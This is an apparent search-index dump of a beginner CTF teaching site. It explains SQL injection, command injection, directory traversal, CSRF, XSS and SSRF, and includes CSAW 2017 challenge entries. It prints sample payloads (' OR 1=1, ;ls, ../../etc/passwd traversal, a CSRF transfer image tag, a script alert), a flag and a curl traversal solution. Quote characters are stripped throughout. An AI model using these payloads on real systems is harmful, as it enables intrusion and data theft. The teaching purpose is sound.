            "text": "Web Exploitation\n\n\nWebsites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework.\n\n\nThese vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privelege.\n\n\nCommon vulnerabilities to see in CTF challenges:\n\n\n\n\nSQL Injection\n\n\nCommand Injection\n\n\nDirectory Traversal\n\n\nCross Site Request Forgery\n\n\nCross Site Scripting\n\n\nServer Side Request Forgery", 
            "title": "Introduction"
        }, 
        {
            "location": "/web-exploitation/introduction/#web-exploitation", 
            "text": "Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework.  These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privelege.  Common vulnerabilities to see in CTF challenges:   SQL Injection  Command Injection  Directory Traversal  Cross Site Request Forgery  Cross Site Scripting  Server Side Request Forgery", 
            "title": "Web Exploitation"
        }, 
        {
            "location": "/web-exploitation/sql-injection/what-is-sql-injection/", 
            "text": "SQL Injection\n\n\nSQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.\n\n\n?php\n\n    \n$username\n \n=\n \n$_GET\n[\nusername\n];\n \n// kchung\n\n    \n$result\n \n=\n \nmysql_query\n(\nSELECT * FROM users WHERE username=\n$username\n);\n\n\n?\n\n\n\n\n\n\nIf we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).\n\n\nBut a malicious user might submit different kind of data. For example, consider if the input was \n?\n\n\nThe application would crash because the resulting SQL query is incorrect.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n\n\n\n\n\n\n\n\nNote\n\n\nNotice the extra single quote at the end.\n\n\n\n\nWith the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.\n\n\nWhat if our input was \n OR 1=1\n?\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \n1\n=\n1\n\n\n\n\n\n\n1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \ntrue\n\n\n\n\n\n\nThis will return every row in the table because each row that exists must be true.\n\n\nWe can also inject comments and termination characters like \n--\n or \n/*\n or \n;\n. This allows you to terminate SQL queries after your injected statements. For example \n--\n is a common SQL injection payload.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n-- \n\n\n\n\n\n\nThis payload sets the username parameter to an empty string to break out of the query and then adds a comment (\n--\n) that effectively hides the second single quote.\n\n\nUsing this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
            "title": "What is SQL Injection"
        }, 
        {
            "location": "/web-exploitation/sql-injection/what-is-sql-injection/#sql-injection", 
            "text": "SQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.  ?php \n     $username   =   $_GET [ username ];   // kchung \n     $result   =   mysql_query ( SELECT * FROM users WHERE username= $username );  ?   If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).  But a malicious user might submit different kind of data. For example, consider if the input was  ?  The application would crash because the resulting SQL query is incorrect.  SELECT   *   FROM   users   WHERE   username =    Note  Notice the extra single quote at the end.   With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.  What if our input was   OR 1=1 ?  SELECT   *   FROM   users   WHERE   username =   OR   1 = 1   1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying  SELECT   *   FROM   users   WHERE   username =   OR   true   This will return every row in the table because each row that exists must be true.  We can also inject comments and termination characters like  --  or  /*  or  ; . This allows you to terminate SQL queries after your injected statements. For example  --  is a common SQL injection payload.  SELECT   *   FROM   users   WHERE   username = --    This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote.  Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
            "title": "SQL Injection"
        }, 
        {
            "location": "/web-exploitation/sql-injection/what-is-sql-injection/", 
            "text": "SQL Injection\n\n\nSQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.\n\n\n?php\n\n    \n$username\n \n=\n \n$_GET\n[\nusername\n];\n \n// kchung\n\n    \n$result\n \n=\n \nmysql_query\n(\nSELECT * FROM users WHERE username=\n$username\n);\n\n\n?\n\n\n\n\n\n\nIf we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).\n\n\nBut a malicious user might submit different kind of data. For example, consider if the input was \n?\n\n\nThe application would crash because the resulting SQL query is incorrect.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n\n\n\n\n\n\n\n\nNote\n\n\nNotice the extra single quote at the end.\n\n\n\n\nWith the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.\n\n\nWhat if our input was \n OR 1=1\n?\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \n1\n=\n1\n\n\n\n\n\n\n1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \ntrue\n\n\n\n\n\n\nThis will return every row in the table because each row that exists must be true.\n\n\nWe can also inject comments and termination characters like \n--\n or \n/*\n or \n;\n. This allows you to terminate SQL queries after your injected statements. For example \n--\n is a common SQL injection payload.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n-- \n\n\n\n\n\n\nThis payload sets the username parameter to an empty string to break out of the query and then adds a comment (\n--\n) that effectively hides the second single quote.\n\n\nUsing this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
            "title": "Exploiting SQL Injection"
        }, 
        {
            "location": "/web-exploitation/sql-injection/what-is-sql-injection/#sql-injection", 
            "text": "SQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.  ?php \n     $username   =   $_GET [ username ];   // kchung \n     $result   =   mysql_query ( SELECT * FROM users WHERE username= $username );  ?   If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).  But a malicious user might submit different kind of data. For example, consider if the input was  ?  The application would crash because the resulting SQL query is incorrect.  SELECT   *   FROM   users   WHERE   username =    Note  Notice the extra single quote at the end.   With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.  What if our input was   OR 1=1 ?  SELECT   *   FROM   users   WHERE   username =   OR   1 = 1   1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying  SELECT   *   FROM   users   WHERE   username =   OR   true   This will return every row in the table because each row that exists must be true.  We can also inject comments and termination characters like  --  or  /*  or  ; . This allows you to terminate SQL queries after your injected statements. For example  --  is a common SQL injection payload.  SELECT   *   FROM   users   WHERE   username = --    This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote.  Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
            "title": "SQL Injection"
        }, 
        {
            "location": "/web-exploitation/command-injection/what-is-command-injection/", 
            "text": "Command Injection\n\n\nCommand Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the \nsystem()\n command or its equivalent in the programming language of the application.\n\n\nimport\n \nos\n\n\n\ndomain\n \n=\n \nuser_input\n()\n \n# ctf101.org\n\n\n\nos\n.\nsystem\n(\nping \n \n+\n \ndomain\n)\n\n\n\n\n\n\nThe above code when used normally will ping the \nctf101.org\n domain.\n\n\nBut consider what would happen if the \nuser_input()\n function returned different data?\n\n\nimport\n \nos\n\n\n\ndomain\n \n=\n \nuser_input\n()\n \n# ; ls\n\n\n\nos\n.\nsystem\n(\nping \n \n+\n \ndomain\n)\n\n\n\n\n\n\nBecause of the additional semicolon, the \nos.system()\n function is instructed to run two commands.\n\n\nIt looks to the program as:\n\n\nping ; ls\n\n\n\n\n\n\n\nNote\n\n\nThe semicolon terminates a command in bash and allows you to put another command after it.\n\n\n\n\nBecause the \nping\n command is being terminated and the \nls\n command is being added on, the \nls\n command will be run in addition to the empty ping command!\n\n\nThis is the core concept behind command injection. The \nls\n command could of course be switched with another command (e.g. wget, curl, bash, etc.)\n\n\nCommand injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.\n\n\nExample Payloads\n\n\n\n\n;ls\n\n\n$(ls)\n\n\n`ls`\n\n\n\n\nRelated Challenges", 
            "title": "What is Command Injection"
        }, 
        {
            "location": "/web-exploitation/command-injection/what-is-command-injection/#command-injection", 
            "text": "Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the  system()  command or its equivalent in the programming language of the application.  import   os  domain   =   user_input ()   # ctf101.org  os . system ( ping    +   domain )   The above code when used normally will ping the  ctf101.org  domain.  But consider what would happen if the  user_input()  function returned different data?  import   os  domain   =   user_input ()   # ; ls  os . system ( ping    +   domain )   Because of the additional semicolon, the  os.system()  function is instructed to run two commands.  It looks to the program as:  ping ; ls   Note  The semicolon terminates a command in bash and allows you to put another command after it.   Because the  ping  command is being terminated and the  ls  command is being added on, the  ls  command will be run in addition to the empty ping command!  This is the core concept behind command injection. The  ls  command could of course be switched with another command (e.g. wget, curl, bash, etc.)  Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.", 
            "title": "Command Injection"
        }, 
        {
            "location": "/web-exploitation/command-injection/what-is-command-injection/#example-payloads", 
            "text": ";ls  $(ls)  `ls`", 
            "title": "Example Payloads"
        }, 
        {
            "location": "/web-exploitation/command-injection/what-is-command-injection/#related-challenges", 
            "text": "", 
            "title": "Related Challenges"
        }, 
        {
            "location": "/web-exploitation/directory-traversal/what-is-directory-traversal/", 
            "text": "Directory Traversal\n\n\nDirectory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.\n\n\nAny kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal.\n\n\nFor example, consider an application that allows the user to choose what page to load from a GET parameter.\n\n\n?php\n\n    \n$page\n \n=\n \n$_GET\n[\npage\n];\n \n// index.php\n\n    \ninclude\n(\n/var/www/html/\n \n.\n \n$page\n);\n\n\n?\n\n\n\n\n\n\nUnder normal operation the page would be \nindex.php\n. But what if a malicious user gave in something different?\n\n\n?php\n\n    \n$page\n \n=\n \n$_GET\n[\npage\n];\n \n// ../../../../../../../../etc/passwd\n\n    \ninclude\n(\n/var/www/html/\n \n.\n \n$page\n);\n\n\n?\n\n\n\n\n\n\nHere the user is submitting \n../../../../../../../../etc/passwd\n.\n\n\nThis will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder.\n\n\ninclude(\n/var/www/html/../../../../../../../../etc/passwd\n);\n\n\n\n\n\n\nUltimately this will become \n/etc/passwd\n because the computer will not go a directory above its top directory.\n\n\nThus the application will load the \n/etc/passwd\n file and emit it to the user like so:\n\n\nroot\n:\nx\n:\n0\n:\n0\n:\nroot\n:/\nroot\n:/\nbin\n/\nbash\n\n\ndaemon\n:\nx\n:\n1\n:\n1\n:\ndaemon\n:/\nusr\n/sbin:/usr/sbin/\nnologin\n\n\nbin\n:\nx\n:\n2\n:\n2\n:\nbin\n:/\nbin\n:/\nusr\n/sbin/\nnologin\n\n\nsys\n:\nx\n:\n3\n:\n3\n:\nsys\n:/\ndev\n:/\nusr\n/sbin/\nnologin\n\n\nsync\n:\nx\n:\n4\n:\n65534\n:\nsync\n:/\nbin\n:/\nbin\n/\nsync\n\n\ngames\n:\nx\n:\n5\n:\n60\n:\ngames\n:/\nusr\n/games:/usr/sbin/\nnologin\n\n\nman\n:\nx\n:\n6\n:\n12\n:\nman\n:/\nvar\n/cache/man:/usr/sbin/\nnologin\n\n\nlp\n:\nx\n:\n7\n:\n7\n:\nlp\n:/\nvar\n/spool/lpd:/usr/sbin/\nnologin\n\n\nmail\n:\nx\n:\n8\n:\n8\n:\nmail\n:/\nvar\n/mail:/usr/sbin/\nnologin\n\n\nnews\n:\nx\n:\n9\n:\n9\n:\nnews\n:/\nvar\n/spool/news:/usr/sbin/\nnologin\n\n\nuucp\n:\nx\n:\n10\n:\n10\n:\nuucp\n:/\nvar\n/spool/uucp:/usr/sbin/\nnologin\n\n\nproxy\n:\nx\n:\n13\n:\n13\n:\nproxy\n:/\nbin\n:/\nusr\n/sbin/\nnologin\n\n\nwww\n-\ndata\n:\nx\n:\n33\n:\n33\n:\nwww\n-\ndata\n:/\nvar\n/www:/usr/sbin/\nnologin\n\n\nbackup\n:\nx\n:\n34\n:\n34\n:\nbackup\n:/\nvar\n/backups:/usr/sbin/\nnologin\n\n\nlist\n:\nx\n:\n38\n:\n38\n:\nMailing\n \nList\n \nManager\n:/\nvar\n/list:/usr/sbin/\nnologin\n\n\nirc\n:\nx\n:\n39\n:\n39\n:\nircd\n:/\nvar\n/run/ircd:/usr/sbin/\nnologin\n\n\ngnats\n:\nx\n:\n41\n:\n41\n:\nGnats\n \nBug\n-\nReporting\n \nSystem\n \n(\nadmin\n):/\nvar\n/lib/gnats:/usr/sbin/\nnologin\n\n\nnobody\n:\nx\n:\n65534\n:\n65534\n:\nnobody\n:/\nnonexistent\n:/\nusr\n/sbin/\nnologin\n\n\nsystemd\n-\ntimesync\n:\nx\n:\n100\n:\n102\n:\nsystemd\n \nTime\n \nSynchronization\n,,,:/\nrun\n/systemd:/bin/\nfalse\n\n\nsystemd\n-\nnetwork\n:\nx\n:\n101\n:\n103\n:\nsystemd\n \nNetwork\n \nManagement\n,,,:/\nrun\n/systemd/netif:/bin/\nfalse\n\n\nsystemd\n-\nresolve\n:\nx\n:\n102\n:\n104\n:\nsystemd\n \nResolver\n,,,:/\nrun\n/systemd/resolve:/bin/\nfalse\n\n\nsystemd\n-\nbus\n-\nproxy\n:\nx\n:\n103\n:\n105\n:\nsystemd\n \nBus\n \nProxy\n,,,:/\nrun\n/systemd:/bin/\nfalse\n\n\n_apt\n:\nx\n:\n104\n:\n65534\n::/\nnonexistent\n:/\nbin\n/\nfalse\n\n\n\n\n\n\nThis same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.", 
            "title": "What is Directory Traversal"
        }, 
        {
            "location": "/web-exploitation/directory-traversal/what-is-directory-traversal/#directory-traversal", 
            "text": "Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.  Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal.  For example, consider an application that allows the user to choose what page to load from a GET parameter.  ?php \n     $page   =   $_GET [ page ];   // index.php \n     include ( /var/www/html/   .   $page );  ?   Under normal operation the page would be  index.php . But what if a malicious user gave in something different?  ?php \n     $page   =   $_GET [ page ];   // ../../../../../../../../etc/passwd \n     include ( /var/www/html/   .   $page );  ?   Here the user is submitting  ../../../../../../../../etc/passwd .  This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder.  include( /var/www/html/../../../../../../../../etc/passwd );   Ultimately this will become  /etc/passwd  because the computer will not go a directory above its top directory.  Thus the application will load the  /etc/passwd  file and emit it to the user like so:  root : x : 0 : 0 : root :/ root :/ bin / bash  daemon : x : 1 : 1 : daemon :/ usr /sbin:/usr/sbin/ nologin  bin : x : 2 : 2 : bin :/ bin :/ usr /sbin/ nologin  sys : x : 3 : 3 : sys :/ dev :/ usr /sbin/ nologin  sync : x : 4 : 65534 : sync :/ bin :/ bin / sync  games : x : 5 : 60 : games :/ usr /games:/usr/sbin/ nologin  man : x : 6 : 12 : man :/ var /cache/man:/usr/sbin/ nologin  lp : x : 7 : 7 : lp :/ var /spool/lpd:/usr/sbin/ nologin  mail : x : 8 : 8 : mail :/ var /mail:/usr/sbin/ nologin  news : x : 9 : 9 : news :/ var /spool/news:/usr/sbin/ nologin  uucp : x : 10 : 10 : uucp :/ var /spool/uucp:/usr/sbin/ nologin  proxy : x : 13 : 13 : proxy :/ bin :/ usr /sbin/ nologin  www - data : x : 33 : 33 : www - data :/ var /www:/usr/sbin/ nologin  backup : x : 34 : 34 : backup :/ var /backups:/usr/sbin/ nologin  list : x : 38 : 38 : Mailing   List   Manager :/ var /list:/usr/sbin/ nologin  irc : x : 39 : 39 : ircd :/ var /run/ircd:/usr/sbin/ nologin  gnats : x : 41 : 41 : Gnats   Bug - Reporting   System   ( admin ):/ var /lib/gnats:/usr/sbin/ nologin  nobody : x : 65534 : 65534 : nobody :/ nonexistent :/ usr /sbin/ nologin  systemd - timesync : x : 100 : 102 : systemd   Time   Synchronization ,,,:/ run /systemd:/bin/ false  systemd - network : x : 101 : 103 : systemd   Network   Management ,,,:/ run /systemd/netif:/bin/ false  systemd - resolve : x : 102 : 104 : systemd   Resolver ,,,:/ run /systemd/resolve:/bin/ false  systemd - bus - proxy : x : 103 : 105 : systemd   Bus   Proxy ,,,:/ run /systemd:/bin/ false  _apt : x : 104 : 65534 ::/ nonexistent :/ bin / false   This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.", 
            "title": "Directory Traversal"
        }, 
        {
            "location": "/web-exploitation/cross-site-request-forgery/what-is-cross-site-request-forgery/", 
            "text": "Cross Site Request Forgery (CSRF)\n\n\nA Cross Site Request Forgery or CSRF Attack, pronounced \nsee surf\n, is an attack on an authenticated user which uses a state session in order to perform state changing attacks like a purchase, a transfer of funds, or a change of email address.\n\n\nThe entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an \nimg\n tag or an \niframe\n where references to external resources are unverified.\n\n\nUsing CSRF\n\n\nGET\n requests are often used by websites to get user input. Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern:\n\n\nhttp://securibank.com/transfer.do?acct=[RECEPIENT]\namount=[DOLLARS]\n\n\nKnowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as:\n\n\nimg src=\nhttp://securibank.com/transfer.do?acct=[RECEPIENT]\namount=[DOLLARS]\n width=\n0\n height=\n0\n border=\n0", 
            "title": "What is Cross Site Request Forgery"
        }, 
        {
            "location": "/web-exploitation/cross-site-request-forgery/what-is-cross-site-request-forgery/#cross-site-request-forgery-csrf", 
            "text": "A Cross Site Request Forgery or CSRF Attack, pronounced  see surf , is an attack on an authenticated user which uses a state session in order to perform state changing attacks like a purchase, a transfer of funds, or a change of email address.  The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an  img  tag or an  iframe  where references to external resources are unverified.", 
            "title": "Cross Site Request Forgery (CSRF)"
        }, 
        {
            "location": "/web-exploitation/cross-site-request-forgery/what-is-cross-site-request-forgery/#using-csrf", 
            "text": "GET  requests are often used by websites to get user input. Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern:  http://securibank.com/transfer.do?acct=[RECEPIENT] amount=[DOLLARS]  Knowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as:  img src= http://securibank.com/transfer.do?acct=[RECEPIENT] amount=[DOLLARS]  width= 0  height= 0  border= 0", 
            "title": "Using CSRF"
        }, 
        {
            "location": "/web-exploitation/cross-site-scripting/what-is-cross-site-scripting/", 
            "text": "Cross Site Scripting (XSS)\n\n\nCross Site Scripting or XSS is a vulnerability where on user of an application can send JavaScript that is executed by the browser of another user of the same application.\n\n\nThis is a vulnerability because JavaScript has a high degree of control over a user's web browser.\n\n\nFor example JavaScript has the ability to:\n\n\n\n\nModify the page (called the DOM)\n\n\nSend more HTTP requests\n\n\nAccess cookies\n\n\n\n\nBy combining all of these abilities, XSS can maliciously use JavaScript to extract user's cookies and send them to an attacker controlled server. XSS can also modify the DOM to phish users for their passwords. This only scratches the surface of what XSS can be used to do.\n\n\nXSS is typically broken down into three categories:\n\n\n\n\nReflected XSS\n\n\nStored XSS\n\n\nDOM XSS\n\n\n\n\nReflected XSS\n\n\nReflected XSS is when an XSS exploit is provided through a URL paramater.\n\n\nFor example:\n\n\nhttps://ctf101.org?data=\nscript\nalert(1)\n/script\n\n\n\n\n\n\nYou can see the XSS exploit provided in the \ndata\n GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM.\n\n\nFor example:\n\n\nhtml\n\n    \nbody\n\n        \nscript\nalert\n(\n1\n)\n/\nscript\n\n    \n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\nDepending on where the exploit gets injected, it may need to be constructed differently.\n\n\nAlso, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit it to an external server, or to simply modify the page to deface it.\n\n\nOne of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker controlled resource. Notice that if the data paramter, wasn't provided the exploit wouldn't work.\n\n\nIn many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicous XSS payloads in URLs.\n\n\nStored XSS\n\n\nStored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself.\n\n\nImagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS.\n\n\nThe reason being that the web site itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user.\n\n\nDOM XSS\n\n\nDOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger.\n\n\nThe server itself is not to blame, but the client side JavaScript files are causing the issue.", 
            "title": "What is Cross Site Scripting"
        }, 
        {
            "location": "/web-exploitation/cross-site-scripting/what-is-cross-site-scripting/#cross-site-scripting-xss", 
            "text": "Cross Site Scripting or XSS is a vulnerability where on user of an application can send JavaScript that is executed by the browser of another user of the same application.  This is a vulnerability because JavaScript has a high degree of control over a user's web browser.  For example JavaScript has the ability to:   Modify the page (called the DOM)  Send more HTTP requests  Access cookies   By combining all of these abilities, XSS can maliciously use JavaScript to extract user's cookies and send them to an attacker controlled server. XSS can also modify the DOM to phish users for their passwords. This only scratches the surface of what XSS can be used to do.  XSS is typically broken down into three categories:   Reflected XSS  Stored XSS  DOM XSS", 
            "title": "Cross Site Scripting (XSS)"
        }, 
        {
            "location": "/web-exploitation/cross-site-scripting/what-is-cross-site-scripting/#reflected-xss", 
            "text": "Reflected XSS is when an XSS exploit is provided through a URL paramater.  For example:  https://ctf101.org?data= script alert(1) /script   You can see the XSS exploit provided in the  data  GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM.  For example:  html \n     body \n         script alert ( 1 ) / script \n     / body  / html   Depending on where the exploit gets injected, it may need to be constructed differently.  Also, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit it to an external server, or to simply modify the page to deface it.  One of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker controlled resource. Notice that if the data paramter, wasn't provided the exploit wouldn't work.  In many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicous XSS payloads in URLs.", 
            "title": "Reflected XSS"
        }, 
        {
            "location": "/web-exploitation/cross-site-scripting/what-is-cross-site-scripting/#stored-xss", 
            "text": "Stored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself.  Imagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS.  The reason being that the web site itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user.", 
            "title": "Stored XSS"
        }, 
        {
            "location": "/web-exploitation/cross-site-scripting/what-is-cross-site-scripting/#dom-xss", 
            "text": "DOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger.  The server itself is not to blame, but the client side JavaScript files are causing the issue.", 
            "title": "DOM XSS"
        }, 
        {
            "location": "/web-exploitation/server-side-request-forgery/what-is-server-side-request-forgery/", 
            "text": "Server Side Request Forgery (SSRF)\n\n\nServer Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines.\n\n\nFor example, say there is a website that lets you take a screenshot of any site on the internet.\n\n\nUnder normal usage a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost ? Or perhaps tries to access something more useful like \nhttp://localhost/server-status\n ?\n\n\n\n\nNote\n\n\n127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers.\n\n\n\n\nDepending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself.\n\n\nIn addition, the requests originating from the server would come from the server's IP not the attackers IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access.\n\n\nAnother usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services.", 
            "title": "What is Server Side Request Forgery"
        }, 
        {
            "location": "/web-exploitation/server-side-request-forgery/what-is-server-side-request-forgery/#server-side-request-forgery-ssrf", 
            "text": "Server Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines.  For example, say there is a website that lets you take a screenshot of any site on the internet.  Under normal usage a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost ? Or perhaps tries to access something more useful like  http://localhost/server-status  ?   Note  127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers.   Depending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself.  In addition, the requests originating from the server would come from the server's IP not the attackers IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access.  Another usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services.", 
            "title": "Server Side Request Forgery (SSRF)"
        }, 
        {
            "location": "/challenges/2017/web/orange/", 
            "text": "orange\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttp://web.chal.csaw.io:7311/?path=orange.txt\n\nI wrote a little proxy program in NodeJS for my poems folder.\nEveryone wants to read \nflag.txt\n but I like it too much to share.\n\n\nFlag\n\n\nflag{thank_you_based_orange_for_this_ctf_challenge}%\n\n\nSolution\n\n\ncurl \nhttp://web.chal.csaw.io:7311/?path=%252e%252e/", 
            "title": "Orange"
        }, 
        {
            "location": "/challenges/2017/web/orange/#orange", 
            "text": "", 
            "title": "orange"
        }, 
        {
            "location": "/challenges/2017/web/orange/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/orange/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/orange/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/orange/#description", 
            "text": "http://web.chal.csaw.io:7311/?path=orange.txt \nI wrote a little proxy program in NodeJS for my poems folder.\nEveryone wants to read  flag.txt  but I like it too much to share.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/orange/#flag", 
            "text": "flag{thank_you_based_orange_for_this_ctf_challenge}%", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/orange/#solution", 
            "text": "curl  http://web.chal.csaw.io:7311/?path=%252e%252e/", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2Basic/", 
            "text": "Gopherz2Basic\n\n\nAuthor\n\n\nKent Ma \n Leon Chou\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nOSIRIS Laboratory                                                  K. Ma\nRequest for Comments: 42031337                                   L. Chou\nObsoletes: 1436                                      New York University\n                                                            October 2107\n\n\n           The Internet Gopher Protocol Version 2 (Gopher/2)\n\nStatus of This Memo\n\n   This memo specifies an Internet standards track protocol for the\n   Internet community. This document describes the protocol, lists some\n   of the implementations currently available, and has an overview of\n   how to implement new client and server applications.\n\n\nAbstract\n\n   This specification describes a modernized expression of the semantics\n   of the Gopher Internet protocol, referred to as Gopher version 2\n   (Gopher/2).\n\n   This specification obsoletes version 1 of the Internet Gopher\n   Protocol.\n\n\n1. Introduction\n\n   The Internet Gopher protocol is a wildly successful protocol.\n   It is currently the primary communications mechanisms for people\n   across the world. However it is missing several core mechanisms\n   for guaranteeing security. Additionally, it is lacking capabilities\n   for user interfaces and modern web document formatting.\n\n   The Gopher/2 defines a key exchange protocol for safe, end-to-end\n   encryption. Additionally, it defines a GopherText format for rendering\n   webpages.\n\n   The Internet Gopher/2 protocol and software follow a client-server\n   model. This model assumes reliable data stream; TCP is assumed.\n   Gopher/2 servers should listen on port 433. Documents reside on many\n   autonomous servers on the Internet. Users run client software on\n   their desktop, connecting to a server and completing a verification\n   process before sending the server a selector (a line of text, which\n   may not be empty) via a TCP connection at a well-known port. The server\n   responds with a block of text and closes the connection.\n\n   Servers return documents. The first line of the response contains the\n   type of the 